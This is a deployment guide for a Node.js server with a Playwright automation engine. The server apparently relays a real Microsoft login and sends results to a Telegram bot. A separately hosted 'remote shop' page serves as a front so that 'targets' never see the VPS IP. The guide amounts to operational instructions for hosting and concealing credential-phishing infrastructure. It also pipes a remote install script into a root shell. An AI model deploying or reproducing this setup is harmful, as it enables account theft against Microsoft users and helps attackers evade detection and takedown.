# 🚀 VPS Deployment Guide

## Prerequisites
- Ubuntu/Debian VPS (minimum 2GB RAM recommended for Playwright)
- Root or sudo access
- Domain name (optional, for production)

## Step 1: Initial VPS Setup

### Update system
```bash
sudo apt update && sudo apt upgrade -y
```

### Install Node.js (v18+)
```bash
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt install -y nodejs
node --version  # Verify installation
```

### Install Git
```bash
sudo apt install -y git
```

### Install PM2 (Process Manager)
```bash
sudo npm install -g pm2
```

## Step 2: Clone Your Repository

```bash
cd /home
git clone https://github.com/00xf5/xyz.git
cd xyz
```

## Step 3: Install Dependencies

```bash
npm install
```

### Install Playwright Browsers (CRITICAL!)
```bash
npx playwright install chromium
npx playwright install-deps  # Install system dependencies
```

## Step 4: Configure Environment Variables

Create `.env` file:
```bash
nano .env
```

Add your configuration:
```env
# Cloudflare Turnstile
TURNSTILE_SITE_KEY=your_site_key_here
TURNSTILE_SECRET_KEY=your_secret_key_here

# Telegram
TELEGRAM_BOT_TOKEN=your_bot_token_here
TELEGRAM_CHAT_ID=your_chat_id_here

# Server
PORT=3000
NODE_ENV=production

# EAPI
API_KEY=your_secure_api_key_here

# Security
REQUIRE_SESSION_TOKEN=true
```

Save with `Ctrl+X`, then `Y`, then `Enter`.

## Step 5: Update Remote Shop Config

Edit `remote_shop/index.html` and update the API URL:
```bash
nano remote_shop/index.html
```

Change:
```javascript
const API_URL = 'http://localhost:3000/eapi';
```

To:
```javascript
const API_URL = 'https://your-vps-ip-or-domain.com/eapi';
```

## Step 6: Start the Server

### Option A: Direct Start (for testing)
```bash
node server.js
```

### Option B: PM2 (recommended for production)
```bash
pm2 start server.js --name "xyz-engine"
pm2 save
pm2 startup  # Follow the command it gives you
```

### Monitor logs
```bash
pm2 logs xyz-engine
```

### Restart server
```bash
pm2 restart xyz-engine
```

## Step 7: Configure Firewall

```bash
sudo ufw allow 22    # SSH
sudo ufw allow 80    # HTTP
sudo ufw allow 443   # HTTPS
sudo ufw allow 3000  # Node.js (if not using reverse proxy)
sudo ufw enable
```

## Step 8: (Optional) Setup Nginx Reverse Proxy

### Install Nginx
```bash
sudo apt install -y nginx
```

### Create Nginx config
```bash
sudo nano /etc/nginx/sites-available/xyz
```

Add:
```nginx
server {
    listen 80;
    server_name your-domain.com;

    location / {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }

    # WebSocket support
    location /ws {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
    }
}
```

Enable site:
```bash
sudo ln -s /etc/nginx/sites-available/xyz /etc/nginx/sites-enabled/
sudo nginx -t
sudo systemctl restart nginx
```

## Step 9: (Optional) SSL with Let's Encrypt

```bash
sudo apt install -y certbot python3-certbot-nginx
sudo certbot --nginx -d your-domain.com
```

## Step 10: Deploy Remote Shop Separately

The `remote_shop/index.html` should be hosted on a **different** platform (Netlify, Vercel, CloudFlare Pages) to avoid exposing your VPS IP.

### Netlify Deployment (Recommended)
1. Create a new repo with ONLY `remote_shop/index.html`
2. Connect to Netlify
3. Deploy

OR manually:
```bash
# Install Netlify CLI locally (not on VPS!)
npm install -g netlify-cli
cd remote_shop
netlify deploy --prod
```

## Useful PM2 Commands

```bash
pm2 list                 # List all processes
pm2 restart xyz-engine   # Restart
pm2 stop xyz-engine      # Stop
pm2 delete xyz-engine    # Remove
pm2 logs xyz-engine      # View logs
pm2 monit               # Monitor resources
```

## Updating Your Code

```bash
cd /home/xyz
git pull origin main
npm install  # If dependencies changed
pm2 restart xyz-engine
```

## Troubleshooting

### Check if server is running
```bash
curl http://localhost:3000
```

### Check ports
```bash
sudo netstat -tulpn | grep :3000
```

### View full logs
```bash
pm2 logs xyz-engine --lines 100
```

### Restart everything
```bash
pm2 restart all
sudo systemctl restart nginx
```

## Security Checklist

- [ ] Changed default SSH port
- [ ] Disabled root SSH login
- [ ] Configured UFW firewall
- [ ] Set strong passwords/keys
- [ ] Updated API keys in `.env`
- [ ] Enabled HTTPS (SSL)
- [ ] Remote shop on different domain
- [ ] Regular backups of `db.json`

## Architecture Overview

```
User → Remote Shop (Netlify/Vercel)
         ↓ (API Calls)
       EAPI (Your VPS)
         ↓
    Automation Engine
         ↓
   Real Microsoft Login
```

**Important**: NEVER expose your VPS IP directly to targets. Always use the remote shop as the entry point.
